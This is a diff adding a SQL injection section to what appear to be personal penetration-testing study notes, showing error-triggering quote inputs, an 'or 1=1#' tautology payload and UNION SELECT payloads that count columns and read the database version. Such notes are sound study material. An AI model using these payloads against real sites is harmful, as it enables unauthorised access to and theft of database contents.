@@ -520,3 +520,32 @@ if you have a meterpreter shell -->  you can use the features `upload/download`
                                to download and upload a file
 
 -----
+## Web Exploitation
+### SQL Injection
+#### Basic check
+- find a value that return something -->  es `jeremy`
+- then try to use characters that might trigger an error:
+  `jeremy'`
+  `jeremy"`
+  `'`
+  `"`
+
+#### Logical Operators
+`jeremy' or 1=1#`
+`or 1=1` -->  returns always true
+`#` -->  end sql queries   (for mysql you can also use `-- -`)
+       => everything after this -->  will be ignored
+
+#### UNION
+we can use it to selects other information or info from another table
+>[!warning] Constraint
+>There is a constraint to use UNION:
+> we can only select -->  the same n° of columns as in the original query
+
+=>
+`jeremy' union select null#`
+`jeremy' union select null,null#`
+`jeremy' union select null,null,null#`
+if you find something:
+=>
+`jeremy' union select null,null,version()#` -->  to read the db version
